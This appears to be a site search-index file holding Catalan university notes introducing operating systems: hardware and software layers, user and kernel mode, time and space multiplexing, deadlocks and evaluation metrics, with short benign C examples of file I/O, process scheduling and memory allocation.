[
  {
    "objectID": "notes/01-introduction.html",
    "href": "notes/01-introduction.html",
    "title": "Introducció",
    "section": "",
    "text": "Un sistema informàtic és la interconnexió d’elements de hardware, software i usuaris que treballen conjuntament per aconseguir un objectiu comú.\n\nEls components hardware són els dispositius físics del sistema, com el processador, la memòria, el disc dur, el teclat, el ratolí, la impressora, etc.\nEls components software són els programes que s’executen en el sistema, com el sistema operatiu, els programes d’aplicació, els controladors de dispositius, etc.\n\nA continuació es mostra un esquema simplificat d’un sistema informàtic.\n\n\n\nSistema Informàtic (Hardware)\n\n\nEn la figura, es representen els components hardware d’un sistema informàtic, com la CPU, la memòria, el disc dur, el teclat, el ratolí o la xarxa. Aquests components interactuen amb el programari, com el sistema operatiu, les aplicacions o els controladors de dispositius, per proporcionar funcionalitats als usuaris. La CPU, per exemple, processa les instruccions, mentre que la memòria guarda la informació temporalment, i els dispositius d’entrada/sortida (com el teclat o el ratolí) permeten la interacció amb els usuaris.\n\n\nEl sistema operatiu actua com a mediador entre el hardware i el software, gestionant els recursos i proporcionant una interfície perquè les aplicacions puguin comunicar-se amb els components físics. Això permet que els usuaris i els desenvolupadors no hagin de preocupar-se per les particularitats del hardware, ja que el sistema operatiu s’encarrega d’abstreure’n la complexitat.\n\n\n\nSistema Operatiu (Software)\n\n\nEn la figura, es mostra com el sistema operatiu actua com a intermediari entre els components hardware i software d’un sistema informàtic.\n\n\n\nEl món es comporta com un gran sistema paral·lel, on molts processos i activitats es duen a terme simultàniament. Per tant, els nostres sistemes informàtics també han de poder actuar en paral·lel per ser eficients i competents. No ens serveix un sistema que només pugui fer una cosa alhora.\nEn informàtica, aquest comportament s’aconsegueix gràcies a la multitasca, que permet que un sistema informàtic executi múltiples processos alhora, optimitzant els recursos disponibles. Això és especialment important en entorns moderns, on un únic ordinador pot executar diverses aplicacions i serveis al mateix temps.\n\n\n\nEls sistemes informàtics moderns són heterogenis i es componen d’una àmplia gamma de components de hardware i software, cada un amb les seves pròpies característiques. Per exemple:\n\nArquitectures de CPU: Inclouen processadors de fabricants com Intel, AMD i ARM, amb diferències significatives en els conjunts d’instruccions, mecanismes de seguretat i vulnerabilitats específiques. També s’han de considerar arquitectures especialitzades com RISC-V i altres dissenys emergents.\nMemòria: Com RAM (memòria d’accés aleatori) de diferents tipus DDR (DDR3, DDR4, DDR5), ROM (memòria només de lectura), memòria cache (L1, L2, L3) i memòries persistents com la memòria flash. Cada tipus de memòria presenta diferents velocitats, capacitat i latència, i s’ha de gestionar de manera eficient per optimitzar el rendiment del sistema.\nDiscs durs: Inclouen HDD (discos durs tradicionals), SSD (unitats d’estat sòlid), NVMe (Non-Volatile Memory Express) i dispositius de memòria externa com USB i targetes de memòria. En un sistema es podem trobar diferents tipus de discos durs, cadascun amb característiques específiques en termes de velocitat, capacitat i durabilitat. A més, si un disc falla, s’ha de poder migrar les dades a un altre disc sense perdre la informació.\nDispositius d’entrada/sortida: Com teclats, ratolins, pantalles, impressores, escàners, càmeres, micròfons, altaveus, etc. Cada dispositiu d’entrada/sortida té les seves pròpies interfícies i controladors, i s’ha de poder gestionar de manera eficient per garantir una interacció fluida amb l’usuari.\nXarxes: Inclouen adaptadors Ethernet, targetes Wi-Fi, routers, commutadors, servidors, dispositius IoT (Internet of Things) i altres components de xarxa.\nSensors i dispositius integrats: Com sensors de temperatura, humitat, acceleròmetres, giroscopis, GPS, etc. Aquests dispositius poden ser utilitzats per recopilar dades ambientals, geolocalització, moviment i altres dades que poden ser crítiques per a la seguretat i el funcionament del sistema.\nFirmware: Com BIOS/UEFI, microcontroladors i altres sistemes de baix nivell. El firmware és el software integrat en components de hardware que controla les funcions més bàsiques del sistema, com l’arrencada, la configuració i la gestió de dispositius. Les vulnerabilitats en el firmware poden ser crítiques, ja que poden permetre als atacants accedir a les funcions més profundes del sistema.\n\n\n\n\nImagineu que un programador hagués de conèixer en detall el funcionament de tots aquests components hardware per escriure un programa.\n\nSeria pràcticament impossible escriure programes eficients sense l’ajuda d’una capa que abstrau la complexitat del maquinari, com fa el sistema operatiu.\n\nImagineu que un programador hagués de desenvolupar un programa diferent per a cada combinació de components hardware.\n\nAbans dels sistemes operatius moderns, això era una realitat. Ara, gràcies a l’abstracció que proporciona el sistema operatiu, els desenvolupadors poden escriure programes que funcionen en múltiples dispositius sense haver de preocupar-se per les diferències del hardware.\n\n\nPer tant, un sistema informàtic és un sistema complex format per components heterogenis i interconnectats, que funcionen en paral·lel i de forma coordinada. On el sistema operatiu actua com a cervell i permet als usuaris i desenvolupadors interactuar amb el sistema de manera eficient i intuïtiva.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#introducció-als-sistemes-informàtics",
    "href": "notes/01-introduction.html#introducció-als-sistemes-informàtics",
    "title": "Introducció",
    "section": "",
    "text": "Un sistema informàtic és la interconnexió d’elements de hardware, software i usuaris que treballen conjuntament per aconseguir un objectiu comú.\n\nEls components hardware són els dispositius físics del sistema, com el processador, la memòria, el disc dur, el teclat, el ratolí, la impressora, etc.\nEls components software són els programes que s’executen en el sistema, com el sistema operatiu, els programes d’aplicació, els controladors de dispositius, etc.\n\nA continuació es mostra un esquema simplificat d’un sistema informàtic.\n\n\n\nSistema Informàtic (Hardware)\n\n\nEn la figura, es representen els components hardware d’un sistema informàtic, com la CPU, la memòria, el disc dur, el teclat, el ratolí o la xarxa. Aquests components interactuen amb el programari, com el sistema operatiu, les aplicacions o els controladors de dispositius, per proporcionar funcionalitats als usuaris. La CPU, per exemple, processa les instruccions, mentre que la memòria guarda la informació temporalment, i els dispositius d’entrada/sortida (com el teclat o el ratolí) permeten la interacció amb els usuaris.\n\n\nEl sistema operatiu actua com a mediador entre el hardware i el software, gestionant els recursos i proporcionant una interfície perquè les aplicacions puguin comunicar-se amb els components físics. Això permet que els usuaris i els desenvolupadors no hagin de preocupar-se per les particularitats del hardware, ja que el sistema operatiu s’encarrega d’abstreure’n la complexitat.\n\n\n\nSistema Operatiu (Software)\n\n\nEn la figura, es mostra com el sistema operatiu actua com a intermediari entre els components hardware i software d’un sistema informàtic.\n\n\n\nEl món es comporta com un gran sistema paral·lel, on molts processos i activitats es duen a terme simultàniament. Per tant, els nostres sistemes informàtics també han de poder actuar en paral·lel per ser eficients i competents. No ens serveix un sistema que només pugui fer una cosa alhora.\nEn informàtica, aquest comportament s’aconsegueix gràcies a la multitasca, que permet que un sistema informàtic executi múltiples processos alhora, optimitzant els recursos disponibles. Això és especialment important en entorns moderns, on un únic ordinador pot executar diverses aplicacions i serveis al mateix temps.\n\n\n\nEls sistemes informàtics moderns són heterogenis i es componen d’una àmplia gamma de components de hardware i software, cada un amb les seves pròpies característiques. Per exemple:\n\nArquitectures de CPU: Inclouen processadors de fabricants com Intel, AMD i ARM, amb diferències significatives en els conjunts d’instruccions, mecanismes de seguretat i vulnerabilitats específiques. També s’han de considerar arquitectures especialitzades com RISC-V i altres dissenys emergents.\nMemòria: Com RAM (memòria d’accés aleatori) de diferents tipus DDR (DDR3, DDR4, DDR5), ROM (memòria només de lectura), memòria cache (L1, L2, L3) i memòries persistents com la memòria flash. Cada tipus de memòria presenta diferents velocitats, capacitat i latència, i s’ha de gestionar de manera eficient per optimitzar el rendiment del sistema.\nDiscs durs: Inclouen HDD (discos durs tradicionals), SSD (unitats d’estat sòlid), NVMe (Non-Volatile Memory Express) i dispositius de memòria externa com USB i targetes de memòria. En un sistema es podem trobar diferents tipus de discos durs, cadascun amb característiques específiques en termes de velocitat, capacitat i durabilitat. A més, si un disc falla, s’ha de poder migrar les dades a un altre disc sense perdre la informació.\nDispositius d’entrada/sortida: Com teclats, ratolins, pantalles, impressores, escàners, càmeres, micròfons, altaveus, etc. Cada dispositiu d’entrada/sortida té les seves pròpies interfícies i controladors, i s’ha de poder gestionar de manera eficient per garantir una interacció fluida amb l’usuari.\nXarxes: Inclouen adaptadors Ethernet, targetes Wi-Fi, routers, commutadors, servidors, dispositius IoT (Internet of Things) i altres components de xarxa.\nSensors i dispositius integrats: Com sensors de temperatura, humitat, acceleròmetres, giroscopis, GPS, etc. Aquests dispositius poden ser utilitzats per recopilar dades ambientals, geolocalització, moviment i altres dades que poden ser crítiques per a la seguretat i el funcionament del sistema.\nFirmware: Com BIOS/UEFI, microcontroladors i altres sistemes de baix nivell. El firmware és el software integrat en components de hardware que controla les funcions més bàsiques del sistema, com l’arrencada, la configuració i la gestió de dispositius. Les vulnerabilitats en el firmware poden ser crítiques, ja que poden permetre als atacants accedir a les funcions més profundes del sistema.\n\n\n\n\nImagineu que un programador hagués de conèixer en detall el funcionament de tots aquests components hardware per escriure un programa.\n\nSeria pràcticament impossible escriure programes eficients sense l’ajuda d’una capa que abstrau la complexitat del maquinari, com fa el sistema operatiu.\n\nImagineu que un programador hagués de desenvolupar un programa diferent per a cada combinació de components hardware.\n\nAbans dels sistemes operatius moderns, això era una realitat. Ara, gràcies a l’abstracció que proporciona el sistema operatiu, els desenvolupadors poden escriure programes que funcionen en múltiples dispositius sense haver de preocupar-se per les diferències del hardware.\n\n\nPer tant, un sistema informàtic és un sistema complex format per components heterogenis i interconnectats, que funcionen en paral·lel i de forma coordinada. On el sistema operatiu actua com a cervell i permet als usuaris i desenvolupadors interactuar amb el sistema de manera eficient i intuïtiva.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#sistema-operatiu-conceptes-bàsics",
    "href": "notes/01-introduction.html#sistema-operatiu-conceptes-bàsics",
    "title": "Introducció",
    "section": "Sistema Operatiu: Conceptes bàsics",
    "text": "Sistema Operatiu: Conceptes bàsics\nUn sistema operatiu és un programa que actua com a intermediari entre l’usuari i el sistema informàtic. El seu objectiu principal és proporcionar als usuaris una interfície simple, neta i coherent del sistema, i gestionar tots els recursos del mateix.\nGràcies al sistema operatiu, els programadors poden escriure programes que s’executin en qualsevol sistema informàtic, independentment dels seus components hardware, i sense necessitat de conèixer-ne els detalls tècnics.\n\nDefinició formal d’un sistema operatiu\n\nUn programa encarregat de l’assignació dels recursos d’un sistema informàtic, així com del control i supervisió de l’execució correcta de les diferents aplicacions i programes.\nUn programa que controla tots els recursos del sistema, proporcionant la base sobre la qual es poden escriure i executar altres programes.\n\n\n\nFuncions d’un sistema operatiu\nEl sistema operatiu compleix quatre funcions essencials que podem destacar:\n\nProporcionar una interfície d’usuari: El sistema operatiu ofereix una interfície que permet als usuaris interactuar amb el sistema informàtic de manera intuïtiva i eficient. Aquesta interfície pot ser gràfica (GUI) o de línia de comandes (CLI).\nProporcionar una plataforma d’execució: El sistema operatiu actua com a plataforma per a l’execució de programes i aplicacions. Proporciona un entorn d’execució segur i aïllat per a les aplicacions.\nGestionar els recursos del sistema: El sistema operatiu gestiona els recursos del sistema, com la memòria, la CPU, el disc dur, la xarxa, etc. Això inclou la planificació de processos, la gestió de la memòria, la gestió de l’emmagatzematge i la gestió de la xarxa.\nProporcionar portabilitat: El sistema operatiu permet que els programes s’executin en diferents sistemes informàtics sense necessitat de modificacions. Això permet als programadors escriure programes una sola vegada i executar-los en múltiples plataformes.\n\n\n\nTipus de sistemes operatius\n\nPròposit general: Windows, Linux, MacOS.\n\nMultitasca, multiusuari, multiprocessador.\nExemples: Windows 11, Ubuntu, MacOS Catalina.\n\nServidors: Unix, Linux.\n\nOptimitzats per a Alt Rendiment: Dissenyats per gestionar grans volums de dades i usuaris simultanis.\nDedicats a tasques específiques com ara servidors web, servidors de correu, servidors de bases de dades, etc.\nExemples: Debian, AlmaLinux, FreeBSD.\n\nDispositius mòbils: iOS, Android.\n\nOptimitzats per a Dispositius Táctils: Interfícies i funcionalitats adaptades per a l’ús mòbil.\n\nSistemes encastats: RTOS (Real-Time Operating System).\n\nOptimitzats per a sistemes encastats i temps real.\nExemples: FreeRTOS, VxWorks, QNX.\n\nSistemes Especifics: Sistemes operatius optimitzats per a tasques específiques, com ara sistemes de control de trànsit, sistemes de navegació, sistemes de televisió digital, etc.\nUnikernels: Sistemes operatius optimitzats per a aplicacions específiques.\n\nExemples: MirageOS, OSv, ClickOS.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#nivells-en-un-sistema-informàtic",
    "href": "notes/01-introduction.html#nivells-en-un-sistema-informàtic",
    "title": "Introducció",
    "section": "Nivells en un Sistema Informàtic",
    "text": "Nivells en un Sistema Informàtic\nLa figura següent mostra les diferents capes d’un sistema informàtic. Aquestes capes es divideixen en dos grans grups:\n\nEn groc es representen els recursos físics (hardware), que inclouen components com la CPU, la memòria i els dispositius d’entrada/sortida.\nEn blau es representen els components software, amb especial atenció al sistema operatiu, que s’executa tant en mode usuari (verd) com en mode sistema (vermell), també conegut com a mode kernel.\n\n\n\n\nSistema Operatiu\n\n\n\nFunció del Mode Usuari i el Mode Sistema\nEls programes d’aplicació (com el client de correu, el navegador web o el reproductor musical) s’executen en mode usuari, que és un entorn restringit on les aplicacions no poden accedir directament al maquinari ni a altres parts crítiques del sistema. Per garantir la seguretat i estabilitat del sistema, les aplicacions han de fer crides al sistema per accedir a funcionalitats gestionades pel sistema operatiu, com la gestió de fitxers o la comunicació per xarxa.\nEl mode sistema (o mode kernel) és on s’executen les parts més crítiques del sistema operatiu, com la gestió de recursos, els controladors de dispositius i altres serveis fonamentals. Aquest mode té accés complet al maquinari, i és aquí on es prenen decisions importants sobre l’ús de recursos, l’assignació de memòria i la planificació de processos.\n\n\nComponents del Sistema Operatiu\nEl sistema operatiu es divideix en diverses capes, cadascuna responsable de funcions específiques.\n\nL’interfície d’usuari del sistema operatiu inclou serveis que poden ser utilitzats pels programes d’aplicació. Aquests serveis faciliten la interacció entre el programari d’usuari i el maquinari del sistema. Alguns exemples d’aquests serveis són:\n\nSistema de fitxers: Permet als programes crear, llegir, escriure i esborrar fitxers d’una manera organitzada. Per exemple, un programa de processament de textos que guarda un document al disc dur interactua amb el sistema de fitxers per dur a terme aquesta operació.\nPlanificació de processos: El sistema operatiu decideix quin procés s’executa en cada moment. Per exemple, en un entorn multitarea, el sistema operatiu distribueix el temps de CPU entre múltiples programes en execució com un navegador web i un editor de text, assegurant que cap d’ells bloquegi els altres.\nMemòria virtual: Aquesta funció permet que els programes utilitzin més memòria del que hi ha físicament disponible. Per exemple, si un programa necessita més memòria del que la RAM pot oferir, el sistema operatiu utilitza part del disc dur com a memòria virtual per simular un espai de memòria més gran.\nProtocol TCP/IP: Proporciona serveis de comunicació en xarxa, permetent que els programes es comuniquin a través d’internet. Per exemple, un navegador utilitza aquest servei per enviar i rebre dades d’un servidor web.\n\nCapa d’abstracció de maquinari: Proporciona una interfície que amaga la complexitat del maquinari amb l’objectiu de facilitar el desenvolupament d’aplicacions.\n\nPer exemple, un programador no necessita saber com funciona un disc dur específic; el sistema operatiu ofereix una interfície que permet als programes accedir al disc d’una manera consistent, independentment del model o fabricant del dispositiu.\n\n\n\n\nComponents en l’Espai d’Usuari\nEn l’espai d’usuari, també hi trobem diversos elements importants que faciliten la interacció amb el sistema operatiu:\n\nLes llibreries del sistema són col·leccions de funcions que permeten als programes accedir als serveis del sistema operatiu. Quan un programa necessita realitzar una operació privilegiada, com accedir a un fitxer o comunicar-se amb la xarxa, utilitza aquestes llibreries per fer una crida al sistema.\n\nExemple: Si un programa vol llegir un fitxer, pot utilitzar funcions de la llibreria stdio.h per fer-ho. Aquesta llibreria amaga els detalls tècnics i ens permet interactuar amb el maquinari de manera més senzilla. En aquest cas, fopen() és una funció de la llibreria stdio.h que obre un fitxer per a lectura o escriptura.\n\nEls programes d’usuari són els programes que els usuaris executen directament, com navegadors web, editors de text o jocs. Aquests programes fan ús dels serveis del sistema operatiu mitjançant les llibreries del sistema i poden interactuar amb l’usuari o altres programes.\n\nExemple: Un editor de text com VS Code interactua amb el sistema operatiu per obrir fitxers, mostrar contingut a la pantalla i rebre entrades de l’usuari (com tecles o clics de ratolí).\n\nEl shell és un programa especial que permet als usuaris interactuar directament amb el sistema operatiu a través d’una interfície de línia de comandes (CLI). El shell interpreta les ordres de l’usuari i les tradueix en crides al sistema operatiu per dur a terme accions com llistats de directoris, copiar fitxers o executar programes.\n\nExemple: Quan un usuari introdueix l’ordre ls en un terminal Unix, el shell tradueix aquesta ordre en una crida al sistema que llista els fitxers d’un directori.\n\n\nPer tant el sistema operatiu ens ofereix de forma transparent, usable, portable i efiicient una sèrie de serveis que ens permeten interactuar amb el sistema informàtic:\n\nControl d’usuaris i aplicacions.\nGestió d’usuaris i aplicacions.\nGestió de la memòria.\nSistema de fitxers.\nPlanificadors.\nEines de xarxa.\n…",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#funcions-dun-sistema-operatiu-1",
    "href": "notes/01-introduction.html#funcions-dun-sistema-operatiu-1",
    "title": "Introducció",
    "section": "Funcions d’un Sistema Operatiu",
    "text": "Funcions d’un Sistema Operatiu\nEl sistema operatiu actua com a àrbitre entre els diferents programes i usuaris que competeixen pels recursos del sistema i com a il·lusionista que proporciona una abstracció dels recursos físics per simular recursos il·limitats això s’aconsegueix gràcies a la virtualització.\nLa virtualització és una tecnologia que permet crear una versió virtual d’un recurs físic o lògic, com una màquina virtual, un sistema de fitxers o una xarxa. Molts autors defineixen un Sistema Operatiu com una màquina virtual que proporciona una interfície d’abstracció del maquinari real.\n\n1. Il·lusionisme\nEl sistema operatiu proporciona una abstracció dels recursos físics. Aquesta capa d’abstracció permet als usuaris i desenvolupadors treballar amb conceptes lògics en lloc de utilitzar directament els recursos físics del sistema.\n\nInterfície per als recursos físics: El sistema operatiu crea una interfície uniforme per als recursos físics, com el disc dur, la memòria i els dispositius d’entrada/sortida. A través d’aquesta interfície, els usuaris i aplicacions poden interactuar amb els recursos del sistema sense necessitat de conèixer el funcionament intern del maquinari.\n\nPer exemple: Quan un usuari treballa amb un fitxer, no pensa en blocs de dades en un disc dur. El sistema operatiu tradueix les operacions de fitxers (com crear, llegir o escriure) en operacions de blocs de disc. Això fa que la gestió d’arxius sigui molt més intuïtiva per a l’usuari. En el codi següent, es mostra com un programa pot obrir un fitxer, escriure-hi dades i tancar-lo sense haver de preocupar-se dels detalls de com s’emmagatzemen les dades al disc dur. Utilitza funcions de la llibreria stdio.h que proporcionen una interfície FILE i funcions com fopen(), fprintf() i fclose() per interactuar amb el fitxer.\n\n#include &lt;stdio.h&gt;\n\nint main() {\n    // Crear i obrir un fitxer per escriptura\n    FILE *file = fopen(\"example.txt\", \"w\");\n    if (file == NULL) {\n        perror(\"Error obrint el fitxer\");\n        return 1;\n    }\n\n    // Escriure dades al fitxer\n    fprintf(file, \"Hola, món!\\n\");\n\n    // Tancar el fitxer\n    fclose(file);\n\n    // Reobrir el fitxer per lectura\n    file = fopen(\"example.txt\", \"r\");\n    if (file == NULL) {\n        perror(\"Error obrint el fitxer\");\n        return 1;\n    }\n\n    // Llegir i imprimir dades del fitxer\n    char buffer[100];\n    while (fgets(buffer, sizeof(buffer), file) != NULL) {\n        printf(\"%s\", buffer);\n    }\n\n    // Tancar el fitxer\n    fclose(file);\n    return 0;\n}\nMultiplexació de recursos (temps i espai): El sistema operatiu gestiona els recursos del sistema a través de la multiplexació, una tècnica que permet compartir un mateix recurs entre múltiples usuaris o processos de manera simultània o intercalada.\n\nMultiplexació en el temps: En un sistema monoprocessador, el sistema operatiu (SO) divideix el temps de CPU entre diversos processos. Això es fa mitjançant la tècnica de canvi de context, que permet al processador alternar ràpidament entre diferents tasques, creant la il·lusió que totes s’estan executant simultàniament.\n\n\nExemple: En un sistema amb múltiples aplicacions obertes (com un navegador web i un editor de text), el sistema operatiu gestiona el temps de CPU assignant petites fraccions de temps a cada aplicació. Aquest procés és tan ràpid que sembla que totes les aplicacions s’executin al mateix temps.\n\nUn exemple pràctic senzill de multiplexació en el temps es pot veure en un sistema operatiu que alterna l’execució de dos processos senzills (A i B). Per simular-ho en un sistema Unix/Linux, es pot utilitzar el següent codi que imprimeix informació sobre el procés actual i fa una pausa abans de continuar en un bucle infinit.\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    while (1) {\n        printf(\"Process %d is running\\n\", getpid());\n        sleep(1); // Simula una pausa abans de continuar\n    }\n    return 0;\n}\nPer compilar i executar aquest codi, seguiu aquests passos:\n$ vi process.c # Copieu el codi anterior en un fitxer process.c\n$ gcc process.c -o process\n$ ./process\nSi executeu aquest codi, veureu com el procés imprimeix informació sobre el seu PID (identificador de procés) i es pausa durant un segon abans de continuar.\n$ ./process\nProcess 1234 is running\nProcess 1234 is running\nProcess 1234 is running\n...\nSi executeu aquest codi dues vegades en el mateix terminal, obtindreu una sortida com la següent:\n$ ./process & ./process &\n[1] 1234\n[2] 1235\nProcess 1234 is running\nProcess 1235 is running\nProcess 1234 is running\nProcess 1235 is running\n...\nEn aquest cas, el sistema operatiu alterna l’execució entre els dos processos, permetent que s’executin simultàniament. Aquesta tècnica de** multiplexació en el temps** permet que múltiples processos comparteixin el temps de CPU disponible.\nLes figures següents mostren com el sistema operatiu alterna l’execució entre dos processos (A i B) mitjançant la tècnica de multiplexació en el temps.\n\nCreació de dos processos (A i B) : El sistema operatiu crea dos processos (A i B) i els carrega a la memòria.\n\n\n\n\nCreació de processos\n\n\n\nEl planificador del sistema elegeix un dels processos (A) per a l’execució i carrega les seves dades a la CPU.\n\n\n\n\nExecució de processos\n\n\n\nEl procés A s’executa durant un temps determinat (1 segon) i després es posa en estat d’espera. El planificador elegirà ara el procés B per a l’execució.\n\n\n\n\nExecució de processos\n\n\nObservació: Si elimineu la crida sleep(1) del codi, els processos s’executaran tan ràpidament que no podreu veure la sortida clara. Això és degut a la velocitat d’execució i la rapidesa amb què el sistema operatiu alterna entre els processos. A més, no es pot assegurar que el sistema operatiu alterni entre els processos en un ordre específic; això depèn de la planificació del sistema operatiu. És possible que un procés s’executi més vegades que l’altre, depenent de la càrrega del sistema i d’altres factors. Aquest fenomen es coneix com indeterminisme.\nPer tant, el sistema operatiu alterna utiltizant la tècnica de canvi de context per permetre que els dos processos s’executin simultàniament. Els dos processos creuen que tenen accés exclusiu a la CPU, però en realitat comparteixen el temps de CPU disponible.\n\nMultiplexació en l’espai: El sistema operatiu (SO) divideix l’espai de memòria entre els diferents processos que s’executen. Cada procés té assignada una part de la memòria física, però utilitza una memòria virtual que li dóna la il·lusió de tenir més memòria disponible. Això permet a cada aplicació creure que té accés exclusiu a la memòria, mentre que el SO gestiona l’accés real.\n\n\nExemple: En un sistema amb 4 GB de RAM, el sistema operatiu pot utilitzar la tècnica de paginació per permetre que múltiples programes ocupin més espai del que hi ha disponible físicament, desplaçant parts no utilitzades a un fitxer de paginació en el disc dur.\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    int *ptr = malloc(1024 * 1024 * sizeof(int)); // Simula una gran quantitat de memòria\n    if (ptr == NULL) {\n        perror(\"No hi ha prou memòria\");\n        return 1;\n    }\n    printf(\"Memòria assignada\\n\");\n    free(ptr); // Alliberar la memòria\n    return 0;\n}\nEn aquest codi, es reserva una gran quantitat de memòria (1 GB) mitjançant la funció malloc(). Encara que el sistema només disposi de 4 GB de RAM, el sistema operatiu pot gestionar la memòria virtual per permetre que aquesta operació s’executi sense problemes. Quan la memòria ja no es necessita, es pot alliberar amb la funció free(). Aquesta tècnica permet als programes utilitzar més memòria del que hi ha físicament disponible, millorant l’eficiència del sistema.\nUn altre exemple que il·lustra la multiplexació en l’espai és el següent codi que mostra com dos processos poden compartir la mateixa adreça de memòria:\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;assert.h&gt;\n\nint main(int argc, char *argv[]) {\n    int *p = malloc(sizeof(int)); \n    assert(p != NULL);\n    printf(\"(%d) address pointed to by p: %p\\n\", getpid(), p); \n    *p = 0; \n    while (1) {\n        *p = *p + 1;\n        printf(\"(%d) p: %d\\n\", getpid(), *p); \n        }\n    return 0;\n}\nAquest codi crea un procés que reserva memòria per a una variable p i incrementa el seu valor de manera indefinida.\nSi compiles i executes aquest codi, podràs veure com cada procés imprimeix la mateixa adreça de memòria, però amb valors que augmenten de manera independent:\n$ gcc memory.c -o memory\n$ ./memory\n(1234) address pointed to by p: 0x7f8b1c000010\n(1234) p: 1\n(1234) p: 2\n(1234) p: 3\n...\nSi executes aquest codi dues vegades en el mateix terminal:\n$ ./memory & ./memory &\n[1] 1234\n[2] 1235\n(1234) address pointed to by p: 0x7f8b1c000010\n(1235) address pointed to by p: 0x7f8b1c000010\n(1234) p: 1\n(1235) p: 1\n(1234) p: 2\n(1235) p: 2\n(1234) p: 3\n(1235) p: 3\n...\nEn aquest cas, els dos processos comparteixen la mateixa adreça de memòria, però cada un té la il·lusió que té accés exclusiu a la memòria. Aquesta tècnica de multiplexació en l’espai permet als processos utilitzar la memòria de manera eficient, sense interferir entre ells.\nOptimització del rendiment del hardware: Els sistemes operatius poden optimitzar l’ús dels recursos hardware per maximitzar el rendiment. Això inclou tasques com la gestió intel·ligent de la memòria, la planificació de l’ús de la CPU o la distribució de la càrrega en entorns de múltiples processadors.\n\nExemple: Els sistemes MacOS són altament optimitzats per funcionar amb components de hardware específics dels Macs, aconseguint un rendiment més eficient que sistemes com Windows, que han de suportar una gran varietat de configuracions de hardware.\n\n\n\n\n2. Arbitratge\nEl sistema operatiu actua com un àrbitre entre els diferents processos que competeixen pels recursos del sistema. Aquest arbitratge assegura que els recursos s’utilitzin de manera justa i eficient, evitant conflictes i millorant el rendiment general.\n\nGestió de recursos: El SO decideix com distribuir els recursos limitats (com la CPU, la memòria o dispositius d’E/S) entre els diferents programes que s’executen. Això inclou la planificació de processos, la gestió de la memòria i el control de l’accés als dispositius de hardware.\n\nExemple: Quan diversos processos volen accedir a la impressora simultàniament, el sistema operatiu gestiona una cua d’impressió, decidint quin procés pot utilitzar la impressora i en quin ordre, assegurant que els processos s’executen en funció de la seva prioritat o temps d’espera.\n\nEvitació de conflictes i bloquejos: Un altre aspecte important de l’arbitratge és evitar els bloquejos (deadlocks), que ocorren quan dos o més processos es queden esperant indefinidament que un recurs es faci disponible. El sistema operatiu utilitza tècniques com la prevenció de bloquejos o la detenció de bloquejos per gestionar aquests conflictes.\nExemple: Considerem un escenari on dos processos, A i B, necessiten accedir a dos recursos compartits, X i Y, per completar les seves operacions. Suposem que el recurs X és una impressora i el recurs Y és una memòria USB. El procés A necessita imprimir un document i després guardar-lo a la memòria USB, mentre que el procés B necessita guardar un document a la memòria USB i després imprimir-lo.\nSi el procés A adquireix primer la impressora (recurs X) i després intenta accedir a la memòria USB (recurs Y), i al mateix temps el procés B adquireix primer la memòria USB (recurs Y) i després intenta accedir a la impressora (recurs X), es produeix una situació de bloqueig coneguda com a “deadlock”. En aquest cas, el procés A espera indefinidament per accedir al recurs Y que el procés B ja ha bloquejat, mentre que el procés B espera indefinidament per accedir al recurs X que el procés A ja ha bloquejat. Com a resultat, ambdós processos es bloquegen mútuament i cap d’ells no pot completar la seva tasca. El SO ha de detectar aquesta situació i prendre mesures per evitar-la. Una solució, seria elimanar el procés B, esperar la finalització de A i tornar a executar B.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#mètriques-davaluació-dels-sistemes-operatius",
    "href": "notes/01-introduction.html#mètriques-davaluació-dels-sistemes-operatius",
    "title": "Introducció",
    "section": "Mètriques d’avaluació dels Sistemes Operatius",
    "text": "Mètriques d’avaluació dels Sistemes Operatius\nEls sistemes operatius són complexos i han de satisfer una sèrie de requisits en funció de les seves finalitats i entorns d’ús. Com satisfer tots aquests requisits és una tasca difícil, es fan servir una sèrie de mètriques per avaluar el rendiment i la qualitat dels sistemes operatius en funció de diferents mètriques.\n\nOverhead: Quantitat de recursos addicionals que un sistema operatiu utilitza per gestionar els recursos del sistema. Aquest overhead pot afectar el rendiment general del sistema, ja que els recursos que s’utilitzen pel sistema operatiu no estan disponibles per a les aplicacions.\nFairness: Capacitat del sistema operatiu de distribuir els recursos de manera justa entre els diferents processos. Un sistema operatiu just assegura que tots els processos tinguin accés als recursos del sistema de manera equitativa, sense privilegiar uns processos sobre altres.\nTemps de resposta: Temps que triga un sistema en respondre a una sol·licitud de l’usuari. Un sistema operatiu eficient ha de ser capaç de respondre ràpidament a les sol·licituds dels usuaris, minimitzant el temps de resposta i millorant la interactivitat del sistema.\nThroughput: Quantitat de treball que un sistema pot realitzar en una unitat de temps. Un sistema operatiu amb un alt throughput és capaç de processar un gran nombre de tasques simultàniament, millorant l’eficiència del sistema i reduint els temps d’espera dels usuaris.\nFiabilitat: Capacitat de mantenir-se operatiu durant llargs períodes de temps sense fallar. Un sistema fiable ha de ser capaç de recuperar-se de fallades inesperades i mantenir la integritat dels recursos del sistema.\nDisponibilitat: Capacitat de mantenir-se operatiu i accessible per als usuaris en tot moment. Un sistema altament disponible ha de ser capaç de gestionar càrregues de treball variables i mantenir la seva funcionalitat en situacions de sobrecàrrega o fallades.\nPredictibilitat: Capacitat de mantenir un comportament consistent i previsible en diferents situacions. Un sistema previsible ha de ser capaç de respondre de manera coherent a les sol·licituds dels usuaris i mantenir un rendiment estable en tot moment.\nIntegritat: Capacitat de protegir els recursos del sistema contra atacs i amenaces externes. Un sistema amb una bona integritat ha de ser capaç de mantenir la confidencialitat, la integritat i la disponibilitat dels recursos del sistema en tot moment.\nPrivacitat: Capacitat de protegir les dades dels usuaris i garantir la confidencialitat de la informació personal. Un sistema amb una bona privacitat ha de ser 